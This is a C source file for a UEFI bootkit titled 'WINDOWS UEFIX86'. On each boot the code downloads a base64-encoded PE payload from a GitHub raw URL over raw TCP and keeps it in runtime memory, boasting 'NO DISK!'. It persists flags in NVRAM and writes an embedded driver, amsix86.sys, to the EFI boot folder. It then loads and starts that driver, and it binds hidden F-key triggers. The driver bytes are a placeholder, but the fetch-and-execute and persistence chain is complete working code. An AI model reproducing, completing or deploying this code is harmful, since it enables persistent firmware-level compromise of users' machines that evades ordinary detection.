// ============================================================
// permanent_bootkit.c - COMPLETE ALL-IN-ONE UEFI BOOTKIT
// ALL FEATURES: F9/F10/F8+F11 + Auto-Inject via .sys
// Downloads .mui + Extracts .sys + Loads .sys
// ============================================================

#include <efi.h>
#include <efilib.h>
#include <efitcp.h>

// ============================================================
// CONFIGURATION
// ============================================================
#define GITHUB_TXT_URL "http://raw.githubusercontent.com/aswinxks/amsi32/refs/heads/main/amsi.txt"
#define UEFI_TITLE L"WINDOWS UEFIX86"
#define INSTALL_FLAG L"UEFI_HML_Installed"
#define SYS_FILENAME L"amsix86.sys"
#define MUI_VARIABLE L"HML_MUI_Data"
#define F9_TRIGGER L"HML_F9_Trigger"
#define F10_TRIGGER L"HML_F10_Trigger"
#define BEEP_TRIGGER L"HML_Beep_Trigger"
#define OPEN_NOTEPAD L"HML_Open_Notepad"

#define GITHUB_IP1 185
#define GITHUB_IP2 199
#define GITHUB_IP3 111
#define GITHUB_IP4 133
#define GITHUB_PORT 80
#define GITHUB_PATH "/aswinxks/amsi32/refs/heads/main/amsi.txt"

// ============================================================
// EMBEDDED amsix86.sys (will be filled from amsix86_sys.h)
// ============================================================
// #include "amsix86_sys.h"

// Placeholder - replace with actual binary from amsix86_sys.h
unsigned char amsix86_sys_bin[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    // ... ENTIRE amsix86.sys BINARY HERE ...
    0x00, 0x00, 0x00, 0x00
};
UINTN amsix86_sys_size = sizeof(amsix86_sys_bin);

// ============================================================
// GLOBALS
// ============================================================
EFI_SYSTEM_TABLE* g_ST = NULL;
EFI_RUNTIME_SERVICES* g_RT = NULL;
EFI_BOOT_SERVICES* g_BS = NULL;
EFI_HANDLE g_ImageHandle = NULL;
EFI_PHYSICAL_ADDRESS g_MUIAddress = 0;
UINTN g_MUISize = 0;
BOOLEAN g_F8Pressed = FALSE;
BOOLEAN g_FirstBoot = TRUE;

// ============================================================
// BASE64 TABLE
// ============================================================
CHAR8 Base64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

UINT8 Base64CharValue(CHAR8 c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return 0;
}

// ============================================================
// BASE64 DECODE
// ============================================================
EFI_STATUS DecodeBase64ToMUI(CHAR8* Input, UINTN InputLen, VOID** Output, UINTN* OutputLen) {
    UINTN OutputSize = (InputLen * 3) / 4;
    UINT8* Out = NULL;
    UINTN i = 0, j = 0;
    UINT8 buffer[4];
    
    if (Input == NULL || InputLen == 0 || Output == NULL || OutputLen == NULL) {
        return EFI_INVALID_PARAMETER;
    }
    
    Out = AllocateZeroPool(OutputSize);
    if (Out == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }
    
    for (i = 0; i < InputLen; i += 4) {
        for (UINTN k = 0; k < 4; k++) {
            if (i + k < InputLen && Input[i + k] != '=') {
                buffer[k] = Base64CharValue(Input[i + k]);
            } else {
                buffer[k] = 0;
            }
        }
        
        if (j < OutputSize) Out[j++] = (buffer[0] << 2) | (buffer[1] >> 4);
        if (j < OutputSize) Out[j++] = (buffer[1] << 4) | (buffer[2] >> 2);
        if (j < OutputSize) Out[j++] = (buffer[2] << 6) | buffer[3];
    }
    
    if (OutputSize >= 2 && Out[0] == 'M' && Out[1] == 'Z') {
        *Output = Out;
        *OutputLen = OutputSize;
        return EFI_SUCCESS;
    }
    
    FreePool(Out);
    return EFI_VOLUME_CORRUPTED;
}

// ============================================================
// CLEAN OLD .MUI
// ============================================================
EFI_STATUS CleanOldMUI(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    
    Print(L"[*] Cleaning old .mui...\n");
    g_RT->SetVariable(MUI_VARIABLE, &Guid, 0, 0, NULL);
    g_RT->SetVariable(F9_TRIGGER, &Guid, 0, 0, NULL);
    g_RT->SetVariable(F10_TRIGGER, &Guid, 0, 0, NULL);
    g_RT->SetVariable(BEEP_TRIGGER, &Guid, 0, 0, NULL);
    g_RT->SetVariable(OPEN_NOTEPAD, &Guid, 0, 0, NULL);
    Print(L"[+] Old .mui cleaned\n");
    
    return EFI_SUCCESS;
}

// ============================================================
// DOWNLOAD FROM GITHUB
// ============================================================
EFI_STATUS DownloadFromGitHub(VOID** Output, UINTN* OutputLen) {
    EFI_STATUS Status;
    EFI_TCP4_PROTOCOL* Tcp = NULL;
    EFI_HANDLE* TcpHandles = NULL;
    UINTN NumHandles = 0;
    EFI_IP_ADDRESS ServerIP;
    UINT8 Response[65536];
    UINTN ResponseLen = 0;
    CHAR8 Request[512];
    UINTN Retries = 10;
    
    Print(L"[*] Downloading from GitHub...\n");
    Print(L"[*] URL: %s\n", GITHUB_TXT_URL);
    
    while (Retries > 0) {
        Status = g_BS->LocateHandleBuffer(
            ByProtocol,
            &gEfiTcp4ProtocolGuid,
            NULL,
            &NumHandles,
            &TcpHandles
        );
        
        if (!EFI_ERROR(Status) && NumHandles > 0) {
            Print(L"[+] Network connected\n");
            break;
        }
        
        Print(L"[!] Waiting for network (%d retries)...\n", Retries);
        g_BS->Stall(2000000);
        Retries--;
    }
    
    if (EFI_ERROR(Status) || NumHandles == 0) {
        Print(L"[!] Network not available\n");
        return EFI_NOT_FOUND;
    }
    
    Status = g_BS->HandleProtocol(
        TcpHandles[0],
        &gEfiTcp4ProtocolGuid,
        (VOID**)&Tcp
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to open TCP\n");
        return Status;
    }
    
    ServerIP.v4.Addr[0] = GITHUB_IP1;
    ServerIP.v4.Addr[1] = GITHUB_IP2;
    ServerIP.v4.Addr[2] = GITHUB_IP3;
    ServerIP.v4.Addr[3] = GITHUB_IP4;
    
    EFI_TCP4_ACCESS_POINT AccessPoint;
    ZeroMem(&AccessPoint, sizeof(AccessPoint));
    AccessPoint.RemotePort = GITHUB_PORT;
    AccessPoint.RemoteAddress = ServerIP;
    AccessPoint.ActiveFlag = TRUE;
    
    Status = Tcp->Connect(Tcp, &AccessPoint);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Connection failed\n");
        Tcp->Close(Tcp);
        return Status;
    }
    
    AsciiSPrint(Request, sizeof(Request),
        "GET %s HTTP/1.1\r\n"
        "Host: raw.githubusercontent.com\r\n"
        "Connection: close\r\n"
        "\r\n",
        GITHUB_PATH
    );
    
    UINTN Sent = 0;
    Status = Tcp->Transmit(Tcp, &Sent, Request, AsciiStrLen(Request));
    if (EFI_ERROR(Status)) {
        Print(L"[!] Send failed\n");
        Tcp->Close(Tcp);
        return Status;
    }
    
    while (1) {
        UINTN Received = 0;
        UINT8 Buffer[4096];
        Status = Tcp->Receive(Tcp, &Received, Buffer, sizeof(Buffer));
        
        if (EFI_ERROR(Status) || Received == 0) break;
        
        if (ResponseLen + Received < sizeof(Response)) {
            CopyMem(Response + ResponseLen, Buffer, Received);
            ResponseLen += Received;
        } else {
            Print(L"[!] Response too large\n");
            break;
        }
    }
    
    Tcp->Close(Tcp);
    
    if (ResponseLen == 0) {
        Print(L"[!] No data received\n");
        return EFI_NOT_FOUND;
    }
    
    Print(L"[+] Received %d bytes\n", ResponseLen);
    
    UINT8* BodyStart = Response;
    UINTN BodyLen = ResponseLen;
    
    for (UINTN i = 0; i < ResponseLen - 4; i++) {
        if (Response[i] == '\r' && Response[i+1] == '\n' &&
            Response[i+2] == '\r' && Response[i+3] == '\n') {
            BodyStart = Response + i + 4;
            BodyLen = ResponseLen - (i + 4);
            break;
        }
    }
    
    CHAR8* Content = (CHAR8*)BodyStart;
    UINTN ContentLen = BodyLen;
    
    while (ContentLen > 0 && (Content[ContentLen-1] == '\n' || 
                              Content[ContentLen-1] == '\r' || 
                              Content[ContentLen-1] == ' ')) {
        ContentLen--;
    }
    
    *Output = Content;
    *OutputLen = ContentLen;
    
    Print(L"[+] Downloaded: %d bytes\n", ContentLen);
    return EFI_SUCCESS;
}

// ============================================================
// STORE .MUI IN UEFI MEMORY
// ============================================================
EFI_STATUS StoreMUIInUEFIMemory(VOID* MUIData, UINTN MUISize) {
    EFI_STATUS Status;
    EFI_PHYSICAL_ADDRESS MemoryAddress;
    
    Print(L"[*] Storing .mui in UEFI memory (NO DISK!)...\n");
    
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    g_RT->SetVariable(MUI_VARIABLE, &Guid, 0, 0, NULL);
    
    Status = g_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        EFI_SIZE_TO_PAGES(MUISize + 0x1000),
        &MemoryAddress
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] Memory allocation failed\n");
        return Status;
    }
    
    CopyMem((VOID*)(UINTN)MemoryAddress, MUIData, MUISize);
    
    g_MUIAddress = MemoryAddress;
    g_MUISize = MUISize;
    
    g_RT->SetVariable(
        L"MUI_Address",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(MemoryAddress),
        &MemoryAddress
    );
    
    g_RT->SetVariable(
        L"MUI_Size",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(MUISize),
        &MUISize
    );
    
    Print(L"[+] .mui stored: 0x%p (%d bytes) NO DISK!\n", MemoryAddress, MUISize);
    return EFI_SUCCESS;
}

// ============================================================
// SET TRIGGER
// ============================================================
EFI_STATUS SetTrigger(CHAR16* TriggerName, UINT32 TriggerValue) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    return g_RT->SetVariable(
        TriggerName,
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(TriggerValue),
        &TriggerValue
    );
}

// ============================================================
// BEEP (Hardware Speaker)
// ============================================================
VOID BeepHardware(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 BeepValue = 0x1;
    
    g_RT->SetVariable(
        BEEP_TRIGGER,
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(BeepValue),
        &BeepValue
    );
    Print(L"\x07");
    Print(L"[+] BEEP!\n");
}

// ============================================================
// HANDLE F9 (HD-Player - NO BEEP)
// ============================================================
EFI_STATUS HandleF9(VOID) {
    Print(L"\n============================================\n");
    Print(L"  F9 - HD-Player.exe (NO BEEP)\n");
    Print(L"============================================\n");
    
    EFI_STATUS Status = SetTrigger(F9_TRIGGER, 0xDEADBEEF);
    if (!EFI_ERROR(Status)) {
        Print(L"[+] Trigger set for HD-Player.exe\n");
    }
    return Status;
}

// ============================================================
// HANDLE F10 (Notepad - BEEP!)
// ============================================================
EFI_STATUS HandleF10(VOID) {
    Print(L"\n============================================\n");
    Print(L"  F10 - Notepad.exe (BEEP!)\n");
    Print(L"============================================\n");
    
    EFI_STATUS Status = SetTrigger(F10_TRIGGER, 0xCAFEBABE);
    if (!EFI_ERROR(Status)) {
        BeepHardware();
        Print(L"[+] Trigger set for Notepad.exe\n");
    }
    return Status;
}

// ============================================================
// OPEN NOTEPAD (F8 + F11)
// ============================================================
EFI_STATUS OpenNotepad(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 OpenValue = 0x1;
    
    Print(L"\n============================================\n");
    Print(L"  Opening Notepad.exe...\n");
    Print(L"============================================\n");
    
    EFI_STATUS Status = g_RT->SetVariable(
        OPEN_NOTEPAD,
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(OpenValue),
        &OpenValue
    );
    
    if (!EFI_ERROR(Status)) {
        Print(L"[+] Notepad will open in Windows\n");
    }
    return Status;
}

// ============================================================
// SAVE amsix86.sys TO EFI PARTITION
// ============================================================
EFI_STATUS SaveAMsix86Sys(VOID) {
    EFI_STATUS Status;
    EFI_FILE_PROTOCOL* Root = NULL;
    EFI_FILE_PROTOCOL* File = NULL;
    EFI_FILE_IO_INTERFACE* FileSystem = NULL;
    EFI_HANDLE* Handles = NULL;
    UINTN NumHandles = 0;
    UINTN BufferSize = amsix86_sys_size;
    
    Print(L"[*] Extracting amsix86.sys...\n");
    
    // Check if .sys exists
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 SysInstalled = 0;
    UINTN DataSize = sizeof(SysInstalled);
    Status = g_RT->GetVariable(L"SYS_Installed", &Guid, NULL, &DataSize, &SysInstalled);
    if (!EFI_ERROR(Status) && SysInstalled == 0x1) {
        Print(L"[+] amsix86.sys already installed\n");
        return EFI_SUCCESS;
    }
    
    Status = g_BS->LocateHandleBuffer(
        ByProtocol,
        &gEfiSimpleFileSystemProtocolGuid,
        NULL,
        &NumHandles,
        &Handles
    );
    
    if (EFI_ERROR(Status) || NumHandles == 0) {
        Print(L"[!] No file system found\n");
        return EFI_NOT_FOUND;
    }
    
    Status = g_BS->HandleProtocol(
        Handles[0],
        &gEfiSimpleFileSystemProtocolGuid,
        (VOID**)&FileSystem
    );
    if (EFI_ERROR(Status)) return Status;
    
    Status = FileSystem->OpenVolume(FileSystem, &Root);
    if (EFI_ERROR(Status)) return Status;
    
    // Create Boot directory
    Root->Open(Root, &File, L"\\EFI\\Boot", EFI_FILE_MODE_READ, 0);
    if (!File) {
        Root->Open(Root, &File, L"\\EFI\\Boot", 
                   EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE, 0);
    }
    if (File) File->Close(File);
    
    CHAR16 FilePath[] = L"\\EFI\\Boot\\amsix86.sys";
    Status = Root->Open(
        Root,
        &File,
        FilePath,
        EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE,
        0
    );
    
    if (EFI_ERROR(Status) || !File) {
        Print(L"[!] Failed to create amsix86.sys\n");
        Root->Close(Root);
        return Status;
    }
    
    Status = File->Write(File, &BufferSize, amsix86_sys_bin);
    File->Close(File);
    Root->Close(Root);
    
    if (!EFI_ERROR(Status)) {
        UINT32 Installed = 0x1;
        g_RT->SetVariable(L"SYS_Installed", &Guid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            sizeof(Installed), &Installed);
        Print(L"[+] amsix86.sys extracted: %d bytes\n", amsix86_sys_size);
    }
    
    return Status;
}

// ============================================================
// LOAD amsix86.sys INTO KERNEL
// ============================================================
EFI_STATUS LoadAMsix86Sys(VOID) {
    EFI_STATUS Status;
    EFI_HANDLE DriverHandle = NULL;
    VOID* DriverBuffer = NULL;
    UINTN DriverSize = 0;
    
    Print(L"[*] Loading amsix86.sys into kernel...\n");
    
    // Check if already loaded
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 SysLoaded = 0;
    UINTN DataSize = sizeof(SysLoaded);
    Status = g_RT->GetVariable(L"SYS_Loaded", &Guid, NULL, &DataSize, &SysLoaded);
    if (!EFI_ERROR(Status) && SysLoaded == 0x1) {
        Print(L"[+] amsix86.sys already loaded\n");
        return EFI_SUCCESS;
    }
    
    // Read .sys from EFI partition
    EFI_FILE_PROTOCOL* Root = NULL;
    EFI_FILE_PROTOCOL* File = NULL;
    EFI_FILE_IO_INTERFACE* FileSystem = NULL;
    EFI_HANDLE* Handles = NULL;
    UINTN NumHandles = 0;
    
    Status = g_BS->LocateHandleBuffer(
        ByProtocol,
        &gEfiSimpleFileSystemProtocolGuid,
        NULL,
        &NumHandles,
        &Handles
    );
    
    if (EFI_ERROR(Status) || NumHandles == 0) {
        Print(L"[!] No file system found\n");
        return EFI_NOT_FOUND;
    }
    
    Status = g_BS->HandleProtocol(
        Handles[0],
        &gEfiSimpleFileSystemProtocolGuid,
        (VOID**)&FileSystem
    );
    if (EFI_ERROR(Status)) return Status;
    
    Status = FileSystem->OpenVolume(FileSystem, &Root);
    if (EFI_ERROR(Status)) return Status;
    
    CHAR16 FilePath[] = L"\\EFI\\Boot\\amsix86.sys";
    Status = Root->Open(Root, &File, FilePath, EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(Status) || !File) {
        Print(L"[!] amsix86.sys not found\n");
        Root->Close(Root);
        return EFI_NOT_FOUND;
    }
    
    // Get file size
    EFI_FILE_INFO* FileInfo = NULL;
    UINTN InfoSize = 0;
    File->GetInfo(File, &gEfiFileInfoGuid, &InfoSize, NULL);
    if (InfoSize > 0) {
        FileInfo = AllocatePool(InfoSize);
        File->GetInfo(File, &gEfiFileInfoGuid, &InfoSize, FileInfo);
        DriverSize = (UINTN)FileInfo->FileSize;
    }
    FreePool(FileInfo);
    
    if (DriverSize == 0) {
        File->Close(File);
        Root->Close(Root);
        return EFI_NOT_FOUND;
    }
    
    DriverBuffer = AllocatePool(DriverSize);
    if (!DriverBuffer) {
        File->Close(File);
        Root->Close(Root);
        return EFI_OUT_OF_RESOURCES;
    }
    
    UINTN BufferSize = DriverSize;
    Status = File->Read(File, &BufferSize, DriverBuffer);
    File->Close(File);
    Root->Close(Root);
    
    if (EFI_ERROR(Status)) {
        FreePool(DriverBuffer);
        return Status;
    }
    
    // Load driver
    Status = g_BS->LoadImage(
        FALSE,
        g_ImageHandle,
        NULL,
        DriverBuffer,
        DriverSize,
        &DriverHandle
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] LoadImage failed: %r\n", Status);
        FreePool(DriverBuffer);
        return Status;
    }
    
    Status = g_BS->StartImage(DriverHandle, NULL, NULL);
    
    if (!EFI_ERROR(Status)) {
        UINT32 Loaded = 0x1;
        g_RT->SetVariable(L"SYS_Loaded", &Guid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            sizeof(Loaded), &Loaded);
        Print(L"[+] amsix86.sys loaded into kernel!\n");
    } else {
        Print(L"[!] StartImage failed: %r\n", Status);
    }
    
    FreePool(DriverBuffer);
    return Status;
}

// ============================================================
// CHECK INSTALLED
// ============================================================
BOOLEAN IsInstalled(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Installed = 0;
    UINTN DataSize = sizeof(Installed);
    
    EFI_STATUS Status = g_RT->GetVariable(INSTALL_FLAG, &Guid, NULL, &DataSize, &Installed);
    return (!EFI_ERROR(Status) && Installed == 0xDEADBEEF);
}

EFI_STATUS MarkInstalled(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Installed = 0xDEADBEEF;
    
    return g_RT->SetVariable(
        INSTALL_FLAG,
        &Guid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
        sizeof(Installed),
        &Installed
    );
}

// ============================================================
// LOAD .MUI ON BOOT
// ============================================================
EFI_STATUS LoadMUIOnBoot(VOID) {
    EFI_STATUS Status;
    VOID* TXTData = NULL;
    UINTN TXTSize = 0;
    VOID* MUIData = NULL;
    UINTN MUISize = 0;
    
    Print(L"\n[*] Loading .mui from GitHub...\n");
    
    CleanOldMUI();
    
    Status = DownloadFromGitHub(&TXTData, &TXTSize);
    if (EFI_ERROR(Status) || !TXTData || TXTSize == 0) {
        Print(L"[!] Download failed\n");
        return EFI_NOT_FOUND;
    }
    
    Status = DecodeBase64ToMUI((CHAR8*)TXTData, TXTSize, &MUIData, &MUISize);
    if (EFI_ERROR(Status) || !MUIData || MUISize == 0) {
        Print(L"[!] Decode failed\n");
        return EFI_VOLUME_CORRUPTED;
    }
    
    Print(L"[+] .mui decoded: %d bytes\n", MUISize);
    
    Status = StoreMUIInUEFIMemory(MUIData, MUISize);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to store .mui\n");
        return Status;
    }
    
    Print(L"[+] .mui ready in UEFI memory (NO DISK!)\n");
    g_FirstBoot = FALSE;
    
    return EFI_SUCCESS;
}

// ============================================================
// FIRST TIME INSTALL
// ============================================================
EFI_STATUS FirstTimeInstall(VOID) {
    EFI_STATUS Status;
    VOID* TXTData = NULL;
    UINTN TXTSize = 0;
    VOID* MUIData = NULL;
    UINTN MUISize = 0;
    
    Print(L"\n[*] FIRST TIME INSTALLATION...\n");
    
    Status = DownloadFromGitHub(&TXTData, &TXTSize);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Download failed\n");
        return EFI_NOT_FOUND;
    }
    
    Status = DecodeBase64ToMUI((CHAR8*)TXTData, TXTSize, &MUIData, &MUISize);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Decode failed\n");
        return EFI_VOLUME_CORRUPTED;
    }
    
    Print(L"[+] .mui decoded: %d bytes\n", MUISize);
    
    Status = StoreMUIInUEFIMemory(MUIData, MUISize);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to store .mui\n");
        return Status;
    }
    
    Status = SaveAMsix86Sys();
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to save .sys\n");
        return Status;
    }
    
    Status = LoadAMsix86Sys();
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to load .sys\n");
        return Status;
    }
    
    MarkInstalled();
    
    Print(L"\n[+] INSTALLATION COMPLETE!\n");
    Print(L"[+] .mui in UEFI memory (NO DISK!)\n");
    Print(L"[+] amsix86.sys loaded in kernel\n");
    
    return EFI_SUCCESS;
}

// ============================================================
// MAIN ENTRY
// ============================================================
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_STATUS Status;
    EFI_INPUT_KEY Key;
    BOOLEAN Installed = FALSE;
    
    g_ST = SystemTable;
    g_RT = SystemTable->RuntimeServices;
    g_BS = SystemTable->BootServices;
    g_ImageHandle = ImageHandle;
    InitializeLib(ImageHandle, SystemTable);
    
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"  %s\n", UEFI_TITLE);
    Print(L"  ALL-IN-ONE UEFI BOOTKIT\n");
    Print(L"  [F9] HD-Player.exe (NO BEEP)\n");
    Print(L"  [F10] Notepad.exe (BEEP!)\n");
    Print(L"  [F8] + [F11] Open Notepad.exe\n");
    Print(L"  .mui in UEFI memory (NO DISK!)\n");
    Print(L"  amsix86.sys in kernel\n");
    Print(L"============================================\n");
    
    Installed = IsInstalled();
    
    if (!Installed) {
        Status = FirstTimeInstall();
        if (EFI_ERROR(Status)) {
            Print(L"[!] Installation failed\n");
        }
        Print(L"\nPress any key to boot Windows...\n");
        g_BS->WaitForEvent(1, &g_ST->ConIn->WaitForKey, NULL);
        g_ST->ConIn->ReadKeyStroke(g_ST->ConIn, &Key);
        return EFI_SUCCESS;
    }
    
    Print(L"\n[*] Loading fresh .mui...\n");
    LoadMUIOnBoot();
    
    Status = SaveAMsix86Sys();
    Status = LoadAMsix86Sys();
    
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"  %s READY\n", UEFI_TITLE);
    Print(L"  [F9] HD-Player.exe (NO BEEP)\n");
    Print(L"  [F10] Notepad.exe (BEEP!)\n");
    Print(L"  [F8] + [F11] Open Notepad.exe\n");
    Print(L"  .mui in UEFI memory (NO DISK!)\n");
    Print(L"  amsix86.sys loaded in kernel\n");
    Print(L"============================================\n");
    
    while (1) {
        g_BS->WaitForEvent(1, &g_ST->ConIn->WaitForKey, NULL);
        g_ST->ConIn->ReadKeyStroke(g_ST->ConIn, &Key);
        
        if (Key.ScanCode == SCAN_F9) {
            HandleF9();
        }
        
        if (Key.ScanCode == SCAN_F10) {
            HandleF10();
        }
        
        if (Key.ScanCode == SCAN_F8) {
            g_F8Pressed = TRUE;
            Print(L"[*] F8 pressed. Press F11 to open Notepad...\n");
        }
        
        if (Key.ScanCode == SCAN_F11 && g_F8Pressed) {
            OpenNotepad();
            g_F8Pressed = FALSE;
        }
        
        if (Key.ScanCode != SCAN_F8 && Key.ScanCode != SCAN_F11) {
            g_F8Pressed = FALSE;
        }
        
        if (Key.ScanCode == SCAN_ESC) {
            Print(L"\n[*] Exiting to Windows...\n");
            break;
        }
    }
    
    return EFI_SUCCESS;
}